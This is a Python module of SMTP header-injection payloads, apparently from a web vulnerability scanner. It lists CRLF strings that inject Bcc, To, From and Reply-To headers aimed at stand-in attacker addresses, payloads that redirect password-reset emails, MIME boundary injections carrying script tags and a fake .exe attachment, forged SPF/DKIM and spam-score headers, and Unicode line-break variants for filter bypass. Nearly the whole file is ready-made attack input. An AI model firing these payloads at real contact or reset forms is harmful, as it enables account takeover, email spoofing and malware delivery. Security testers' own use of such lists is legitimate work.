"""
SMTP Injection Payloads

Payloads for SMTP injection attacks including:
- CRLF injection
- CC/BCC injection
- Subject header injection
- From header injection
- Body injection
"""

# CRLF injection payloads for SMTP header injection
SMTP_CRLF_INJECTION = [
    {
        "name": "bcc_injection",
        "payload": "victim@target.com\r\nBcc: evil@hacker.com",
        "description": "BCC injection via CRLF",
        "injection_point": "email",
    },
    {
        "name": "cc_injection",
        "payload": "victim@target.com\r\nCc: evil@hacker.com",
        "description": "CC injection via CRLF",
        "injection_point": "email",
    },
    {
        "name": "to_injection",
        "payload": "victim@target.com%0D%0ATo: evil@hacker.com",
        "description": "To header injection (URL encoded CRLF)",
        "injection_point": "to",
    },
    {
        "name": "from_injection",
        "payload": "victim@target.com\r\nFrom: evil@hacker.com",
        "description": "From header injection",
        "injection_point": "from",
    },
    {
        "name": "reply_to_injection",
        "payload": "victim@target.com\r\nReply-To: evil@hacker.com",
        "description": "Reply-To header injection",
        "injection_point": "reply_to",
    },
]

# Subject header injection
SUBJECT_INJECTION = [
    {
        "name": "subject_crlf",
        "payload": "Reset Request\r\nSubject: EVIL SUBJECT",
        "description": "Subject header injection via CRLF",
        "injection_point": "subject",
    },
    {
        "name": "subject_encoded",
        "payload": "Reset%0D%0ASubject: EVIL SUBJECT",
        "description": "Subject injection (URL encoded)",
        "injection_point": "subject",
    },
    {
        "name": "subject_bcc",
        "payload": "Request\r\nSubject: Test\r\nBcc: evil@hacker.com",
        "description": "BCC injection via Subject",
        "injection_point": "subject",
    },
]

# Email address manipulation
EMAIL_MANIPULATION = [
    {
        "name": "comment_injection",
        "payload": "victim@target.com(evil@hacker.com)",
        "description": "Email comment injection",
        "injection_point": "email",
    },
    {
        "name": "plus_addressing",
        "payload": "victim+evil@target.com",
        "description": "Plus addressing bypass",
        "injection_point": "email",
    },
    {
        "name": "dot_trick",
        "payload": "v.i.c.t.i.m@target.com",
        "description": "Dot trick for Gmail",
        "injection_point": "email",
    },
]

# Body injection payloads
BODY_INJECTION = [
    {
        "name": "smtp_body_crlf",
        "payload": "Test\r\n.\r\nEVIL MESSAGE BODY",
        "description": "SMTP body termination and injection",
        "injection_point": "message_body",
    },
    {
        "name": "subject_body_injection",
        "payload": "Test\r\nSubject: EVIL\r\n.\r\nREAL BODY",
        "description": "Subject injection in body",
        "injection_point": "message_body",
    },
]

# Password reset specific SMTP injection
PASSWORD_RESET_SMTP = [
    {
        "name": "reset_to_injection",
        "payload": "victim@target.com\r\nTo: hacker@evil.com",
        "description": "Password reset To header injection",
        "injection_point": "email",
    },
    {
        "name": "reset_bcc_injection",
        "payload": "victim@target.com%0D%0ABcc: hacker@evil.com",
        "description": "Password reset BCC injection",
        "injection_point": "email",
    },
]

# Contact form SMTP injection
CONTACT_FORM_SMTP = [
    {
        "name": "message_injection",
        "payload": "Message from victim\r\n.\r\nSent from attacker",
        "description": "Message body injection",
        "injection_point": "message",
    },
    {
        "name": "name_email_injection",
        "payload": "Name\r\nEmail: attacker@evil.com",
        "description": "Name field email injection",
        "injection_point": "name",
    },
]

# Newsletter subscription injection
NEWSLETTER_SMTP = [
    {
        "name": "subscribe_cc",
        "payload": "victim@target.com%0D%0ACc: evil@hacker.com",
        "description": "Newsletter CC injection",
        "injection_point": "email",
    },
    {
        "name": "unsubscribe_all",
        "payload": "victim@target.com%0D%0ABcc: all@evil.com",
        "description": "Unsubscribe all users injection",
        "injection_point": "email",
    },
]

# Advanced SMTP attack vectors
ADVANCED_SMTP = [
    {
        "name": "sender_header",
        "payload": "victim@target.com\r\nSender: evil@hacker.com",
        "description": "Sender header injection",
        "injection_point": "email",
    },
    {
        "name": "return_path",
        "payload": "victim@target.com%0D%0AReturn-Path: evil@hacker.com",
        "description": "Return-Path header injection",
        "injection_point": "email",
    },
    {
        "name": "errors_to",
        "payload": "victim@target.com\r\nErrors-To: evil@hacker.com",
        "description": "Errors-To header injection",
        "injection_point": "email",
    },
    {
        "name": "x_headers_injection",
        "payload": "victim@target.com\r\nX-Priority: 1\r\nX-MS-Exchange-Organization-SCL: 1",
        "description": "X-header injection",
        "injection_point": "email",
    },
]

# URL encoded CRLF variants
CRLF_URL_ENCODED = [
    "%0D%0A",  # CRLF URL encoded
    "%0D%0A%0D%0A",  # Double CRLF
    "%250D%250A",  # Double URL encoded
    "\r\n",
    "\n",
    "\r",
]

# Common injection points for SMTP
SMTP_INJECTION_POINTS = [
    "email",
    "to",
    "from",
    "reply_to",
    "cc",
    "bcc",
    "subject",
    "message",
    "body",
    "sender",
    "return_path",
    "errors_to",
    "name",
    "contact",
]

# Success indicators for SMTP injection
SMTP_INJECTION_SUCCESS = [
    "evil@hacker.com",
    "evil@evil.com",
    "attacker",
    "hacker.com",
    "Bcc:",
    "Cc:",
    "To:",
    "evil.com",
    "hacker@evil.com",
]

# SMTP-related error patterns
SMTP_ERROR_PATTERNS = [
    "invalid recipient",
    "malformed address",
    "syntax error",
    "invalid header",
    "invalid email",
    "missing to",
    "missing from",
]

# Unicode CRLF variants for bypass
UNICODE_CRLF_VARIANTS = [
    "\u000d\u000a",  # Unicode CR LF
    "\u0085",  # NEL (Next Line)
    "\u2028",  # Line Separator
    "\u2029",  # Paragraph Separator
    "%E2%80%A8",  # URL encoded Line Separator
    "%E2%80%A9",  # URL encoded Paragraph Separator
    "%C0%8D%C0%8A",  # Overlong UTF-8 encoding
    "\r\n",  # Standard CRLF
    "%0d%0a",  # URL encoded CRLF
    "%0D%0A",  # URL encoded CRLF (uppercase)
]

# Content-Type header injection
CONTENT_TYPE_INJECTION = [
    {
        "name": "multipart_injection",
        "payload": "victim@target.com\r\nContent-Type: multipart/mixed; boundary=evil",
        "description": "Content-Type multipart injection",
        "injection_point": "email",
    },
    {
        "name": "content_transfer_encoding",
        "payload": "victim@target.com\r\nContent-Transfer-Encoding: base64",
        "description": "Content-Transfer-Encoding injection",
        "injection_point": "email",
    },
    {
        "name": "mime_version",
        "payload": "victim@target.com\r\nMIME-Version: 1.0",
        "description": "MIME-Version header injection",
        "injection_point": "email",
    },
    {
        "name": "content_disposition",
        "payload": "victim@target.com\r\nContent-Disposition: attachment; filename=evil.exe",
        "description": "Content-Disposition injection for attachment",
        "injection_point": "email",
    },
]

# MIME boundary injection
MIME_BOUNDARY_INJECTION = [
    {
        "name": "boundary_injection",
        "payload": "Test\r\n--boundary\r\nContent-Type: text/html\r\n\r\n<script>evil</script>\r\n--boundary--",
        "description": "MIME boundary injection for HTML content",
        "injection_point": "message_body",
    },
    {
        "name": "nested_boundary",
        "payload": "--outer\r\nContent-Type: multipart/alternative; boundary=inner\r\n\r\n--inner\r\nContent-Type: text/html\r\n\r\n<b>evil</b>\r\n--inner--\r\n--outer--",
        "description": "Nested MIME boundary injection",
        "injection_point": "message_body",
    },
    {
        "name": "attachment_boundary",
        "payload": "--boundary\r\nContent-Disposition: attachment; filename=\"malware.exe\"\r\nContent-Transfer-Encoding: base64\r\n\r\nTVqQAAMAAAA\r\n--boundary--",
        "description": "Attachment injection via boundary",
        "injection_point": "message_body",
    },
]

# DKIM/SPF/DMARC bypass attempts
EMAIL_AUTH_BYPASS = [
    {
        "name": "dkim_replay",
        "payload": "victim@target.com\r\nDKIM-Signature: v=1; a=rsa-sha256; d=evil.com",
        "description": "DKIM signature injection attempt",
        "injection_point": "email",
    },
    {
        "name": "received_spf_injection",
        "payload": "victim@target.com\r\nReceived-SPF: pass",
        "description": "SPF pass header injection",
        "injection_point": "email",
    },
    {
        "name": "authentication_results",
        "payload": "victim@target.com\r\nAuthentication-Results: spf=pass; dkim=pass; dmarc=pass",
        "description": "Authentication-Results header injection",
        "injection_point": "email",
    },
    {
        "name": "arc_seal_injection",
        "payload": "victim@target.com\r\nARC-Seal: i=1; a=rsa-sha256; cv=none",
        "description": "ARC-Seal header injection",
        "injection_point": "email",
    },
]

# X-Header injection for spam filter bypass
X_HEADER_INJECTION = [
    {
        "name": "x_spam_status",
        "payload": "victim@target.com\r\nX-Spam-Status: No",
        "description": "X-Spam-Status bypass",
        "injection_point": "email",
    },
    {
        "name": "x_spam_score",
        "payload": "victim@target.com\r\nX-Spam-Score: 0",
        "description": "X-Spam-Score manipulation",
        "injection_point": "email",
    },
    {
        "name": "x_mailer",
        "payload": "victim@target.com\r\nX-Mailer: Microsoft Outlook",
        "description": "X-Mailer spoofing",
        "injection_point": "email",
    },
    {
        "name": "x_originating_ip",
        "payload": "victim@target.com\r\nX-Originating-IP: [10.0.0.1]",
        "description": "X-Originating-IP injection",
        "injection_point": "email",
    },
]

# List-* header injection for mailing list abuse
LIST_HEADER_INJECTION = [
    {
        "name": "list_unsubscribe",
        "payload": "victim@target.com\r\nList-Unsubscribe: <mailto:unsubscribe@evil.com>",
        "description": "List-Unsubscribe header injection",
        "injection_point": "email",
    },
    {
        "name": "list_post",
        "payload": "victim@target.com\r\nList-Post: <mailto:post@evil.com>",
        "description": "List-Post header injection",
        "injection_point": "email",
    },
]

# Combined payload list for easy iteration
ALL_SMTP_PAYLOADS = (
    SMTP_CRLF_INJECTION +
    SUBJECT_INJECTION +
    EMAIL_MANIPULATION +
    BODY_INJECTION +
    PASSWORD_RESET_SMTP +
    CONTACT_FORM_SMTP +
    NEWSLETTER_SMTP +
    ADVANCED_SMTP +
    CONTENT_TYPE_INJECTION +
    MIME_BOUNDARY_INJECTION +
    EMAIL_AUTH_BYPASS +
    X_HEADER_INJECTION +
    LIST_HEADER_INJECTION
)
